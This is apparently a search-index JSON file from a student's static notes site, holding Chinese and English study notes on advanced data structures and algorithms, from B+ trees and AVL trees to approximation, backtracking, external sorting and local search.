{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"Home","text":"<p>\u8fd9\u91cc\u662f Chritch|\u514b\u745e\u5947\uff0c\u6b22\u8fce\u6765\u5230\u6211\u7684\u5b66\u4e60\u6587\u6863<sup>1</sup> :) \u672c\u6587\u6863\u5df2\u505c\u6b62\u66f4\u65b0\uff0c\u6700\u65b0\u5185\u5bb9\u53ef\u89c1 Chritch's Digital Garden</p> <ol> <li> <p>\u672c\u7b14\u8bb0\u672c\u53c2\u8003\u4e86 TonyCrane \u63d0\u4f9b\u7684\u6a21\u677f\u00a0\u21a9</p> </li> </ol>"},{"location":"course/","title":"Introduction","text":"<p>\u8fd9\u91cc\u4f1a\u653e\u4e00\u4e9b\u6574\u7406\u597d\u7684\u8bfe\u7a0b\u7b14\u8bb0</p>"},{"location":"course/ads/","title":"\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u5206\u6790(2021-2022\u6625\u590f)","text":""},{"location":"course/ads/#introduction","title":"Introduction","text":"<p>\u4e0a\u7684\u662f\u53f6\u5fb7\u4ed5\u8001\u5e08\u7684\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u5206\u6790\u8bfe\u7a0b\u3002  </p>"},{"location":"course/ads/#references","title":"References","text":"<ul> <li>\u624b\u5199\u590d\u4e60\u7b14\u8bb0-\u7b97\u6cd5\u90e8\u5206|Carton</li> <li>\u590d\u4e60\u7b14\u8bb0|\u5c0f\u89d2\u9f99 18\u7ea7</li> <li>\u590d\u4e60\u7b14\u8bb0|JerryG 20\u7ea7</li> </ul>"},{"location":"course/ads/Bplus/","title":"Bplus","text":"<p>Tips</p> <ul> <li>\u548c Database B+ Tree \u662f\u4e00\u4e2a\u539f\u7406\uff0c\u76f8\u6bd4\u4e4b\u4e0b\uff0c\u6570\u636e\u5e93\u91cc\u7684\u7528\u6cd5\u548c\u89c4\u5b9a\u66f4\u52a0\u4e25\u8c28\u3002</li> </ul>"},{"location":"course/ads/Bplus/#b-trees","title":"B+ Trees","text":""},{"location":"course/ads/Bplus/#definition","title":"Definition","text":"<p>A B+ tree of order \\(M\\) is a tree with the following structural properties:</p> <ul> <li>The root is either a leaf or has between 2 and M children.</li> <li>All nonleaf nodes (except the root) have between \\(\\lceil M/2 \\rceil\\)  and \\(M\\) children.</li> <li>All leaves are at the save depth, have \\(\\lceil \\frac{M}{2}\\rceil\\sim M\\) elements.</li> </ul>"},{"location":"course/ads/Bplus/#apperance","title":"Apperance","text":""},{"location":"course/ads/Bplus/#time-complexity","title":"Time Complexity","text":"<ul> <li>\\({\\rm depth} = \\log_{\\lceil M/2 \\rceil}{N} = \\frac{\\log{N}}{\\log{M}}\\)</li> <li>\\({\\rm T} = M \\times {\\rm depth} = M \\log{N} / \\log{M}\\)</li> </ul>"},{"location":"course/ads/appr/","title":"Approximation","text":""},{"location":"course/ads/appr/#approximation-ratio","title":"Approximation Ratio","text":"<p>An algorithm has an approximation ratio of \\(\\rho(n)\\) if, for any input of size \\(n\\), the cost \\(C\\) of the solution produced by the algorithm is within a factor of \\(\\rho(n)\\) of the cost \\(C^{*}\\) of an optimal solution: \\(max(\\frac{C}{C^{*}}, \\frac{C^*}{C})\\le \\rho(n)\\)</p> <p>If an algorithm achieves an approximation ratio of \\(\\rho(n)\\), we call it a \\(\\rho(n)-approximation\\ algorithm\\).</p>"},{"location":"course/ads/appr/#polynomial-time-approximation-schemeptas","title":"polynomial-time approximation scheme(PTAS)","text":"<p>An approximation scheme is a polynomial-time approximation scheme if for any fixed \\(\\epsilon &gt; 0\\), \\(ratio\\le 1+\\epsilon\\), the scheme runs in time polynomial in the size of its input instance. e.g. \\(O(n^{2/\\epsilon})\\)</p>"},{"location":"course/ads/appr/#fully-polynomial-time-approximation-schemefptas","title":"fully polynomial-time approximation scheme(FPTAS)","text":"<p>As a special case of PTAS, the run-time of an FPTAS is polynomial in the problem size and in \\(1/\\epsilon\\) e.g.\\(O((1/\\epsilon)^2n^3)\\)</p> <p>FPTAS\u4e0ePTAS\u7684\u5173\u7cfb\u53ef\u7531\u4e0b\u56fe\u8868\u793a\uff1a </p>"},{"location":"course/ads/appr/#bin-packing-problem","title":"Bin Packing Problem","text":""},{"location":"course/ads/appr/#description","title":"Description","text":"<p>\u7ed9\u5b9a\\(n\\)\u4e2a\u7269\u54c1\uff0c\u5927\u5c0f\u5747\u57280\uff5e1\u4e4b\u95f4\uff0c\u628a\u5b83\u4eec\u88c5\u8fdb\u82e5\u5e72\u4e2a\u5bb9\u91cf\u5747\u4e3a1\u7684\u7bb1\u5b50\uff0c\u95ee\u5bb9\u7eb3\u5b83\u4eec\u7684\u7bb1\u5b50\u7684\u6700\u5c0f\u6570\u76ee\\(m\\)\u3002</p>"},{"location":"course/ads/appr/#on-line-algorithm","title":"On-line Algorithm","text":"<p>On-line Algorithm\u6c38\u8fdc\u4e0d\u53ef\u80fd\u6700\u4f18\uff0c\u53ef\u8bc1\u660e\\(ratio\\ge 5/3\\)</p> <ul> <li>Next Fit<ul> <li>\u7b97\u6cd5: \u653e\u5728\u5f53\u524d\u7684bin\u4e2d\uff0c\u4e0d\u591f\u5219\u5f00\u65b0\u7684bin</li> <li>\\(ratio = 2\\)</li> </ul> </li> <li>First Fit<ul> <li>\u7b97\u6cd5: \u5bfb\u627e\u7b2c\u4e00\u4e2a\u53ef\u653e\u7684bin\uff0c\u4e0d\u7136\u5f00\u65b0\u7684bin</li> <li>\\(ratio = 1.7\\)</li> </ul> </li> <li>Best Fit<ul> <li>\u7b97\u6cd5: \u5bfb\u627e\u653e\u5165\u4e4b\u540e\u80fd\u5360\u5f97\u5c3d\u53ef\u80fd\u6ee1\u7684bin\uff0c\u4e0d\u7136\u5f00\u65b0\u7684bin</li> <li>\\(ratio=1.7\\)</li> </ul> </li> </ul>"},{"location":"course/ads/appr/#off-line-algorithm","title":"Off-line Algorithm","text":"<ul> <li>First Fit/Best Fit Decreasing<ul> <li>\u7b97\u6cd5: \u6309\u7167\u4ece\u5927\u5230\u5c0f\u7684\u987a\u5e8f\u6392\u5e8f\uff0c\u7136\u540e\u91c7\u7528First Fit/Best Fit</li> </ul> </li> </ul>"},{"location":"course/ads/appr/#the-knapsack-problem","title":"The Knapsack Problem","text":""},{"location":"course/ads/appr/#fractional-version","title":"fractional version","text":"<ul> <li>\u95ee\u9898\u8868\u8ff0\uff1a\u80cc\u5305\u5bb9\u91cf\u4e3a\\(M\\)\uff0c\u6709N\u4e2a\u7269\u4f53\uff0c\u7b2ci\u4e2a\u7269\u4f53\u7684\u91cd\u91cf\u662f\\(w_i\\)\uff0c\u4ef7\u503c\u4e3a\\(p_i\\)\u3002\u5141\u8bb8\u628a\u7269\u4f53\u7684\\(x_i\\)\u6bd4\u4f8b\u88c5\u5165\uff0c\u5229\u76ca\u4e3a\\(x_ip_i\\)\u3002\u6c42\u5229\u76ca\u6700\u5927\u88c5\u6cd5\u3002</li> <li>optimal algorithm: \u9009\u53d6\\(\\frac{p_i}{w_i}\\)\u6700\u5927\u7684\u5c3d\u53ef\u80fd\u88c5\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002</li> </ul>"},{"location":"course/ads/appr/#01-version","title":"0/1 version","text":"<ul> <li>\u95ee\u9898\u8868\u8ff0\uff1a\u80cc\u5305\u5bb9\u91cf\u4e3a\\(M\\)\uff0c\u6709N\u4e2a\u7269\u4f53\uff0c\u7b2ci\u4e2a\u7269\u4f53\u7684\u91cd\u91cf\u662f\\(w_i\\)\uff0c\u4ef7\u503c\u4e3a\\(p_i\\)\u3002\u53ea\u80fd\u9009\u62e9\u88c5\u5165\u6216\u4e0d\u88c5\u5165\uff0c\u88c5\u5165\u5229\u76ca\u4e3a\\(w_ip_i\\)\u3002\u6c42\u5229\u76ca\u6700\u5927\u88c5\u6cd5\u3002</li> <li>NP-hard Problem</li> <li>greedy\u7b97\u6cd5\u7684\\(ratio=2\\)</li> </ul>"},{"location":"course/ads/appr/#k-center-problem","title":"K-Center Problem","text":""},{"location":"course/ads/appr/#description_1","title":"Description","text":"<p>\u5bf9\u4e8e\u5e73\u9762\u4e0a\u7684\\(n\\)\u4e2a\u70b9\uff0c\u627e\u51fa\u4e0d\u8d85\u8fc7\\(k\\)\u4e2a\u5706\u5fc3\u7684\u4f4d\u7f6e\u8986\u76d6\u6240\u6709\u70b9\uff0c\u6c42\u6700\u5c0f\u534a\u5f84</p>"},{"location":"course/ads/appr/#approximation_1","title":"Approximation","text":"<ul> <li>\u4e00\u4e2a\u7ed3\u8bba\uff1a\u9009\u53d6n\u4e2a\u70b9\u4e2d\u7684\u82e5\u5e72\u70b9\uff0c\u800c\u975e\u9009\u53d6\u5e73\u9762\u4e0a\u7684\u4efb\u610f\u70b9\u3002\u7531\u4e0b\u56fe\u53ef\u77e5\uff0c\u540e\u8005\u7684\u4efb\u610f\u65b9\u6848\uff0c\u90fd\u53ef\u4ee5\u901a\u8fc7\u524d\u8005\u7528\u4e24\u500d\u7684\u534a\u5f84\u66ff\u4ee3\uff0c\u6545\\(ratio = 2\\)\u3002</li> </ul> <ul> <li>\u5177\u4f53\u7b97\u6cd5\uff1a\u901a\u8fc7\u5bf9\u76ee\u6807\u534a\u5f84\\(r\\)\u8fdb\u884c\u679a\u4e3e\uff0c\u5224\u65ad\u662f\u5426\u5b58\u5728\\(k\\)\u4e2a\u5706\u5fc3\u7684\u65b9\u6848\uff0c\u4e8c\u5206\u67e5\u627e\u83b7\u5f97\u3002</li> <li>\u9664\u975e\\(P=NP\\)\uff0c\u5426\u5219K-center\u95ee\u9898\u4e0d\u5b58\u5728\u8fd1\u4f3c\u7387\u5c0f\u4e8e2\u7684\u903c\u8fd1\u7b97\u6cd5</li> </ul>"},{"location":"course/ads/avl/","title":"AVL Trees","text":"<p>Adelson-Velskii-Landis[AVL] Trees</p>"},{"location":"course/ads/avl/#definition","title":"Definition","text":"<ul> <li>The balance factor BF(node) = \\(h_L - h_R\\).</li> <li>In an AVL Tree, BF(node) = -1, 0, 1.</li> </ul>"},{"location":"course/ads/avl/#different-trees","title":"Different Trees","text":"<ul> <li>Perfect Binary Tree</li> <li>Complete Binary Tree</li> <li>Full Binary Tree: has two leaf nodes or not. e.g. Huffman Tree</li> </ul>"},{"location":"course/ads/avl/#rotation","title":"Rotation","text":"<ul> <li> <p>LL Rotation/RR Rotation</p> <ul> <li>Two Single Rotation</li> <li></li> <li></li> </ul> </li> <li> <p>LR Rotation/RL Rotation</p> <ul> <li>Double Rotation</li> <li></li> <li></li> </ul> </li> </ul>"},{"location":"course/ads/avl/#analysis","title":"Analysis","text":"<p>Let \\(n_h\\) be the minimum number of nodes in a height balanced tree of height \\(h\\)</p> \\[ \\begin{aligned} n_h &amp;= n_{h-1} + n_{h-2} + 1\\\\ (n_h + 1) &amp;=(n_{h-1}+1)+(n_{h-2}+1)\\\\ F_h &amp;= F_{h-1} + F_{h}\\ [F_{h+2} = n_h + 1,F_3=2=n_1+1]\\\\ F_h&amp;\\approx\\frac{1}{\\sqrt{5}}(\\frac{1+\\sqrt{5}}{2})^h\\\\ n_h&amp;\\approx\\frac{1}{\\sqrt{5}}(\\frac{1+\\sqrt{5}}{2})^{h+2}-1\\\\ h&amp;=O(\\ln{n}) \\end{aligned} \\]"},{"location":"course/ads/back/","title":"Backtracking","text":""},{"location":"course/ads/back/#definition","title":"Definition","text":"<p>Backtracking enables us to eliminate the explicit examination of a large subset of the candidates while still guaranteeing that the answer will be found if the algorithm is run to termination.</p>"},{"location":"course/ads/back/#_1","title":"\u516b\u7687\u540e\u95ee\u9898","text":"<ul> <li>\u95ee\u9898: \u5728\u68cb\u76d8\u4e2d\u627e\u5230\u516b\u4e2a\u4f4d\u7f6e\u653e\u7f6e\u7687\u540e\uff0c\u4f7f\u5f97\u5b83\u4eec\u90fd\u4e0d\u540c\u884c\u4e14\u4e0d\u540c\u5217\uff0c\u4e5f\u4e0d\u80fd\u540c\u65f6\u4f4d\u4e8e\u5bf9\u89d2\u7ebf\u4e0a</li> </ul>"},{"location":"course/ads/back/#the-turnpike-reconstruction-problem","title":"The Turnpike Reconstruction Problem","text":"<ul> <li>\u95ee\u9898\uff1a\u5728\u4e00\u6761\u76f4\u7ebf\u4e0a\u627e\u5230n\u4e2a\u5730\u65b9\u5efa\u7acb\u52a0\u6cb9\u7ad9\uff0c\u5df2\u77e5\u5b83\u4eec\u4e24\u4e24\u4e4b\u95f4\u7684\u8ddd\u79bb(\\(N(N-2)/2\\)\u7ec4)\uff0c\u6c42\u51fa\u6240\u6709\u52a0\u6cb9\u7ad9\u7684\u4f4d\u7f6e\uff0c\u5047\u5b9a\u7b2c\u4e00\u4e2a\u52a0\u6cb9\u7ad9\u7684\u5750\u6807\u662f0</li> <li>\u7b97\u6cd5\u6d41\u7a0b<ol> <li>\u5148\u5c06\u7b2c\u4e00\u4e2a\u52a0\u6cb9\u7ad9\u548c\u6700\u540e\u4e00\u4e2a\u52a0\u6cb9\u7ad9\u7684\u4f4d\u7f6e\u786e\u5b9a\uff0c\u5e76\u5c06\u5df2\u7ecf\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7684\u8ddd\u79bb\u4ece\u8def\u5f84\u4e2d\u5220\u9664</li> <li>\u627e\u5230\u5269\u4e0b\u7684\u8ddd\u79bb\u4e2d\u6700\u5927\u7684\u8ddd\u79bb\u5e76\u68c0\u9a8c\uff0c\u4e0d\u65ad\u91cd\u590d\u4e0a\u8ff0\u8fc7\u7a0b\uff0c\u5982\u679c\u68c0\u9a8c\u5931\u8d25\u5219\u56de\u5230\u4e0a\u4e00\u79cd\u60c5\u51b5\uff0c\u6062\u590d\u539f\u672c\u88ab\u5220\u9664\u7684\u8ddd\u79bb\u518d\u5f80\u4e0b\u56de\u6eaf</li> </ol> </li> </ul>"},{"location":"course/ads/back/#alpha-beta","title":"\\(\\alpha-\\beta\\) \u526a\u679d","text":""},{"location":"course/ads/back/#minimax-strategy","title":"Minimax Strategy","text":"<ul> <li>\u5728\u4eba\u673a\u5bf9\u5f08\u7684\u65f6\u5019</li> <li>\u4eba\u9700\u8981\u6700\u5c0f\u5316\u5f53\u524d\u60c5\u51b5P\u7684\u53ef\u80fd\u8d62\u7684\u60c5\u51b5\uff0c\u800cAI\u8981\u5c06\u5b83\u6700\u5927\u5316</li> <li>goodness\u51fd\u6570\\(f(P)=W_{AI}-W_{Human}\\)\uff0cW\u662f\u5f53\u524d\u60c5\u51b5\u4e0b\u67d0\u4e00\u65b9\u53ef\u80fd\u8d62\u7684\u6240\u6709\u7ed3\u679c\uff0c\u4e0d\u9700\u8981\u8003\u8651\u53e6\u4e00\u65b9\u540e\u9762\u4f1a\u600e\u4e48\u4e0b\uff0c\u53ea\u8981\u8ba1\u7b97\u81ea\u5df1\u5728\u5f53\u524d\u5c40\u52bf\u4e0b\u7684\u4efb\u4f55\u53ef\u4ee5\u8d62\u7684\u65b9</li> </ul>"},{"location":"course/ads/back/#_2","title":"\u526a\u679d\u7b56\u7565","text":"<ul> <li>\u03b1\u526a\u679d\uff1amin\u5c42\u5728\u9009\u6700\u5c0f\u503c\u65f6\uff0c\u53d1\u73b0\u81ea\u5df1\u5df2\u7ecf\u4e0d\u53ef\u80fd\u662f\u540c\u4e00min\u5c42\u4e2d\u7684\u6700\u5927\u8005\uff0c\u4e0d\u53ef\u80fd\u88abmax\u5c42\u9009\u4e2d\uff0c\u526a\u6389\u5176\u5176\u6240\u6709\u672a\u88ab\u904d\u5386\u8fc7\u7684\u5b50\u8282\u70b9\u3002</li> <li>\u03b2\u526a\u679d\uff1amax\u5c42\u5728\u9009\u6700\u5c0f\u503c\u65f6\uff0c\u53d1\u73b0\u81ea\u5df1\u5df2\u7ecf\u4e0d\u53ef\u80fd\u662f\u540c\u4e00max\u5c42\u4e2d\u7684\u6700\u5c0f\u8005\uff0c\u4e0d\u53ef\u80fd\u88abmin\u5c42\u9009\u4e2d\uff0c\u526a\u6389\u5176\u5176\u6240\u6709\u672a\u88ab\u904d\u5386\u8fc7\u7684\u5b50\u8282\u70b9\u3002</li> </ul>"},{"location":"course/ads/bin/","title":"Binomial Queue","text":""},{"location":"course/ads/bin/#definition","title":"Definition","text":""},{"location":"course/ads/bin/#character","title":"Character","text":"<p>for \\(B_k\\)</p> <ul> <li>has exactly \\(2^k\\) nodes</li> <li>the number of nodes at depth \\(d\\) is \\(\\binom{k}{d}\\)</li> </ul> <p>for a priority queue of size \\(13\\)</p> <ul> <li>\\(13 = 2^0 + 0\\times 2^1 + 2^2 + 2^3 = 1101_2\\)</li> </ul> <p>A binomial queue of \\(N\\) elements can be built by \\(N\\) sccessive insertions in \\(O(N)\\) time.</p>"},{"location":"course/ads/bin/#operation","title":"Operation","text":""},{"location":"course/ads/bin/#findmin","title":"FindMin","text":"<p>There are at most \\(\\lceil \\log{N}\\rceil\\) roots, hence \\(T_p = O(\\log{N})\\)</p>"},{"location":"course/ads/bin/#merge","title":"Merge","text":"<p>\\(T_p = O(\\log{N})\\)</p>"},{"location":"course/ads/bin/#deletemin","title":"DeleteMin","text":"<p>\\(T_p=O(\\log{N})\\)</p>"},{"location":"course/ads/bin/#decreased-key","title":"Decreased Key","text":"<p>\\(T_p=O(\\log{N})\\)</p>"},{"location":"course/ads/divide/","title":"Divide and Conquer","text":""},{"location":"course/ads/divide/#recursive-tree","title":"Recursive tree","text":""},{"location":"course/ads/divide/#master-theory","title":"Master Theory","text":""},{"location":"course/ads/divide/#form1","title":"Form1","text":"<p>The recurrence \\(T(N) = aT(N/b) + f(N)\\) can be solved as follows:</p> <ol> <li>If \\(af(N/b) = Kf(N)\\) for some constant \\(K&lt;1\\), then \\(T(N)=\\Theta(f(N))\\)</li> <li>If \\(af(N/b) = Kf(N)\\) for some constant \\(K&gt;1\\), then \\(T(N)=\\Theta(N^{log_{b}{a}})\\)</li> <li>If \\(af(N/b) = f(N)\\), then \\(T(N)=\\Theta(f(N)log_b{N})\\)</li> </ol>"},{"location":"course/ads/divide/#form2","title":"Form2","text":"<p>The recurrence \\(T(N)=aT(N/b) + \\Theta(N^k\\log^p{N})\\) where \\(a\\ge 1, b&gt; 1, p\\ge 0\\)\uff1a</p> <ol> <li>\\(T(N)=O(N^{\\log_b{a}})\\), if \\(a&gt;b^k\\)</li> <li>\\(T(N)=O(N^k\\log^{p+1}{N})\\), if \\(a=b^k\\)</li> <li>\\(T(N)=O(N^k\\log^{p}{N})\\), if \\(a&lt;b^k\\)</li> </ol>"},{"location":"course/ads/divide/#form3","title":"Form3","text":"<p>The recurrence \\(T(N)=aT(N/b)+f(N)\\)</p> <ol> <li>If \\(f(N)=O(N^{\\log_b{a}-\\varepsilon})\\) for some constant \\(\\varepsilon&gt;0\\), then \\(T(N)=\\Theta(N^{\\log_b{a}})\\)</li> <li>If \\(f(N)=\\Theta(N^{\\log_b{a}})\\), then \\(T(N)=\\Theta(N^{\\log_b{a}}\\log{N})\\)</li> <li>If \\(f(N)=\\Omega(N^{\\log_{b}{a}+\\varepsilon})\\), for some constant \\(\\varepsilon&gt;0\\), and if \\(af(N/b)&lt;cf(N)\\) for some constant \\(c&lt;1\\) and all sufficiently large \\(N\\), then \\(T(N)=\\Theta(f(N))\\)</li> </ol>"},{"location":"course/ads/divide/#special-case","title":"Special case","text":"<p>\u6c42\u89e3\uff1a\\(T(N)=2T(\\sqrt{N})+\\log{N}\\)</p> \\[ \\begin{aligned} &amp;let\\ N = 2^m\\\\ &amp;thus\\ T(N)=2T(\\sqrt{N})+\\log{N}\\to T(2^m)=T(2^{\\frac{m}{2}})+m\\\\ &amp;let\\ G(m)=T(2^m)\\\\ &amp;thus\\ G(m)=G(m/2)+m \\to G(m)=m\\log{m}=\\log{n}\\log\\log{n} \\end{aligned} \\]"},{"location":"course/ads/dp/","title":"Dynamic Program","text":"<p>\u52a8\u6001\u89c4\u5212\uff08\u7b80\u79f0dp\uff09\uff0c\u662f\u975e\u5e38\u91cd\u8981\u548c\u5e38\u89c1\u7684\u7b97\u6cd5\u601d\u60f3\uff0c\u57fa\u672c\u60f3\u6cd5\u4e5f\u662f\u628a\u5927\u95ee\u9898 \u8f6c\u5316\u4e3a\u8f83\u5c0f\u7684\u5b50\u95ee\u9898\uff0c\u4f46\u4e0e\u5206\u6cbb\u601d\u60f3\u4e0d\u540c\u7684\u662f\uff0c\u5206\u6cbb\u662f\u5c06\u5927\u95ee\u9898\u8f6c\u5316\u4e3a\u82e5\u5e72\u4e2a\u4e0d\u76f8 \u5173\u8054\u7684\u5c0f\u95ee\u9898\uff0c\u5173\u952e\u5728\u4e8e\u5982\u4f55\u5408\u5e76\u3002\u800cdp\u5219\u662f\u5c1d\u8bd5\u4ece\u5c0f\u95ee\u9898\u5f00\u59cb\uff0c\u9010\u6b65\u751f\u6210\u6700\u7ec8\u7684 \u5927\u95ee\u9898\uff0c\u5173\u952e\u5728\u4e8e\u5982\u4f55\u63a8\u8fdb\u751f\u6210\u3002\u6ce8\u610f\u4e5f\u8981\u8bb2dp \u533a\u522b\u4e8e\u9012\u5f52\uff0c\u9012\u5f52\u662f\u5148\u4ece\u9876\u5c42\u8003 \u8651\uff0c\u4e00\u8def\u5411\u4e0b\uff0c\u9047\u5230\u57fa\u672c\u60c5\u51b5\u540e\u518d\u56de\u6eaf\uff0c\u800cdp\u5219\u662f\u5148\u201c\u642d\u5730\u57fa\u201d\uff0c\u628a\u57fa\u672c\u60c5\u51b5\u5168\u90e8 \u89e3\u51fa\uff0c\u9010\u6b65\u5411\u4e0a\u6700\u7ec8\u5f97\u5230\u7ed3\u679c\uff0c\u76f8\u6bd4\u4e8e\u9012\u5f52\uff0cdp\u5f80\u5f80\u80fd\u51cf\u5c11\u91cd\u590d\u8ba1\u7b97\uff0c\u8fd9\u662f\u56e0\u4e3a\u4ece \u7b97\u6cd5\u7684\u5f62\u5f0f\u6765\u8bb2\uff0cdp\u7684\u5f62\u5f0f\u5f80\u5f80\u662f\u8fed\u4ee3\u3002</p>"},{"location":"course/ads/external/","title":"External Sorting","text":"<p>Tip</p> <ul> <li>\u5728 Database Query Process \u4e2d\u63d0\u5230\u8fc7External Sort\u3002</li> </ul>"},{"location":"course/ads/external/#what-are-the-concerns","title":"What are the concerns","text":"<ul> <li>Seek time: O(number of passes)</li> <li>Block transfers: Time to read or write one block of records</li> <li>Time to internally sort M records</li> <li>Time to merge N records from input buffers to the output buffer</li> </ul>"},{"location":"course/ads/external/#how-to-reduce-the-number-of-passes","title":"How to reduce the number of passes?","text":"<ul> <li>\u4f7f\u7528 k-way merge\uff0cpasses = \\(1+\\lceil \\log_k(N/M)\\rceil\\)\uff0c\u4f46\u662f\u9700\u89812k\u7684tapes</li> <li>\u5f53\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6590\u6ce2\u90a3\u5951\u5f0f\u7684\u5408\u5e76\u65b9\u6cd5\uff0c\u53ea\u9700\u8981k+1\u4e2atapes</li> </ul>"},{"location":"course/ads/external/#how-to-handle-the-buffers-for-parallel-operation","title":"How to Handle the Buffers for parallel operation?","text":"<ul> <li>\u5bf9buffer\u7684\u8bfb\u53d6/\u5199\u56de\u8fdb\u884c\u4f18\u5316</li> <li>\u5bf9\u4e8e\u4e00\u4e2aK\u8def\u5f52\u5e76\uff0c\u9700\u89812k\u4e2a\u8f93\u5165buffer\u548c2\u4e2a\u8f93\u51fabuffer\u6765\u8fdb\u884c\u5e76\u884c\u64cd\u4f5c<ul> <li>\u4e3a\u4ec0\u4e48\u4e0d\u662fk\u548c1\uff1f\u7b54\uff1a\u56e0\u4e3a\u662f\u4e00\u4e2a\u6b63\u5f0f\u4e00\u4e2a\u7f13\u51b2</li> </ul> </li> <li>\u4e8b\u5b9e\u4e0aK\u4e0d\u662f\u8d8a\u5927\u8d8a\u597d\uff0c\u56e0\u4e3a\u5982\u679cK\u589e\u5927\uff0c\u5c31\u4f1a\u5bfc\u81f4input buffer\u7684\u6570\u91cf\u9700\u6c42\u589e\u52a0\uff0c\u5bfc\u81f4buffer size\u51cf\u5c11\uff0c\u5bfc\u81f4\u78c1\u76d8\u4e2d\u4e00\u4e2ablock\u7684size\u51cf\u5c11\uff0c\u5bfc\u81f4\u8bbf\u95ee\u78c1\u76d8\u7684seek time\u589e\u52a0\uff0c\u56e0\u6b64\u6700\u4f18\u7684K\u503c\u53d6\u51b3\u4e8e\u78c1\u76d8\u7684\u53c2\u6570\u548c\u5916\u90e8memory\u7684\u89c4\u6a21</li> </ul>"},{"location":"course/ads/external/#how-to-generate-a-longer-run","title":"How to generate a longer run?","text":"<ul> <li>\u4f7f\u7528\u5806\u7684\u7ed3\u6784\u6765\u8fdb\u884c\u6392\u5e8f\u64cd\u4f5c\uff0c\u89c4\u5219\u662f\u4e00\u76f4\u53d6\u51fa\u5806\u4e2d\u73b0\u5b58\u7684\u53ef\u4ee5\u653e\u5728\u73b0\u5728\u6240\u5728\u7684run\u540e\u9762\u7684\u6700\u5c0f\u7684\u6570\uff0c\u76f4\u5230\u5806\u4e2d\u7684\u6570\u636e\u90fd\u653e\u4e0d\u8fdb\u5f53\u524drun\u4e86\u518d\u66f4\u6362\u4e00\u4e2arun</li> <li>\u5982\u679c\u5185\u5b58\u53ef\u4ee5\u5bb9\u7eb3M\u4e2a\u5143\u7d20\uff0c\u5219\u8fd9\u79cd\u65b9\u6cd5\u751f\u6210\u7684run\u7684\u5e73\u5747\u957f\u5ea6\u4e3a2M</li> <li>\u5728\u8f93\u5165\u7684\u5143\u7d20\u63a5\u8fd1\u5df2\u7ecf\u6392\u597d\u5e8f\u7684\u72b6\u6001\u65f6\u975e\u5e38\u6709\u6548</li> </ul>"},{"location":"course/ads/external/#how-to-minimize-the-merge-time","title":"How to minimize the merge time?","text":"<p>\u4f7f\u7528Huffman\u6811 </p>"},{"location":"course/ads/greedy/","title":"Greedy","text":""},{"location":"course/ads/greedy/#activity-selection-problem","title":"Activity Selection Problem","text":""},{"location":"course/ads/greedy/#_1","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u7ed9\u5b9an\u6761\u7ebf\u6bb5\uff0c\u9009\u53d6\u6700\u5927\u7684\u96c6\u5408\uff0c\u4f7f\u5f97\u96c6\u5408\u4e2d\u7684\u7ebf\u6bb5\u4e24\u4e24\u4e0d\u76f8\u4ea4\u3002</p>"},{"location":"course/ads/greedy/#solution","title":"Solution","text":"<p>\u9009\u53d6\u6700\u5148\u7ed3\u675f\u7684\u7ebf\u6bb5</p>"},{"location":"course/ads/greedy/#huffmans-algorithm","title":"Huffman's Algorithm","text":""},{"location":"course/ads/greedy/#definition","title":"definition","text":"<p>Every time pop two minist nodes from the heap, and add them to the tree with the new merging node push into the heap, until the heap is empty.</p>"},{"location":"course/ads/greedy/#example","title":"example","text":""},{"location":"course/ads/inverse/","title":"Inverted File Index","text":""},{"location":"course/ads/inverse/#definition","title":"Definition","text":"<p>Index is a mechanism for locating a given term in a text.</p> <p>Inverted file contains a list of pointers, Inverted because it lists for a term</p>"},{"location":"course/ads/inverse/#modules","title":"Modules","text":"<ul> <li>Token analyzer + stop filter<ul> <li>Word Stemming</li> <li>Stop Words</li> </ul> </li> <li>index<ul> <li>search tree</li> <li>hash table<ul> <li>distributed index</li> </ul> </li> </ul> </li> <li>Dynamic indexing<ul> <li>Docs come in / deleted</li> </ul> </li> <li>Thresholding<ul> <li>only retrieve the top x documents</li> </ul> </li> </ul>"},{"location":"course/ads/inverse/#measures","title":"Measures","text":"<ul> <li>How fast does it index</li> <li>How fast does it search</li> <li>Expressiveness of query language</li> </ul>"},{"location":"course/ads/inverse/#data-retrieval-performance","title":"Data retrieval performance","text":"<ul> <li>index space</li> <li>response time</li> </ul>"},{"location":"course/ads/inverse/#relevance-measurement-requires-3-elements","title":"Relevance measurement requires 3 elements","text":"<ul> <li>A benchmark document collection</li> <li>A benchmark suite of queries</li> <li> <p>A binary assessment of either relevent or irrelevant for each query-doc pair</p> relevant Irrelevant Retrived \\(R_R\\) \\(I_R\\) Not Retrived \\(R_N\\) \\(I_N\\) <ul> <li>Precision \\(P =R_R/(R_R+I_R)\\)</li> <li>Recall \\(R = R_R/(R_R+R_N)\\)</li> </ul> </li> </ul>"},{"location":"course/ads/left/","title":"Leftist Heaps","text":""},{"location":"course/ads/left/#definition-of-npl","title":"Definition of NPL","text":"<p>The null path length, Npl(X), of any node X is the length of the shortest path from X to a node without two children. Define Npl(NULL) = -1. \\(Npl(X)=\\min\\{Npl(C)+1, \\rm for\\ all\\ C\\ as\\ children\\ of\\ X\\}\\)</p>"},{"location":"course/ads/left/#definition-of-leftist-heap","title":"Definition of leftist heap","text":"<p>The leftist heap property is that for every node X in the heap, the null path length of the left child is at least as large as that of the right child.</p>"},{"location":"course/ads/left/#theorem","title":"Theorem","text":"<p>A leftlist tree with \\(r\\) nodes on the right path must have at least \\(2^{r} - 1\\) nodes.</p>"},{"location":"course/ads/left/#insertionmerge","title":"Insertion(merge)","text":"<ul> <li>Merge(H1-&gt;Right, H2)</li> <li>Attach(H2, H1-&gt;Right)</li> <li>Swap(H1-&gt;Right, H1-&gt;Left) if necessary</li> </ul>"},{"location":"course/ads/left/#deletemin","title":"DeleteMin","text":"<ul> <li>Delete the root</li> <li>Merge the two subtrees</li> </ul>"},{"location":"course/ads/left/#time-complexity","title":"Time Complexity","text":"<p>\\(T_p=O(\\log{N})\\)</p>"},{"location":"course/ads/local/","title":"Local Search","text":"<p>Local search solves problems approximately, aiming at a local optimum</p> <ul> <li>\\(S\\sim S'\\): \\(S'\\) is a neighboring solution of S-S' can be 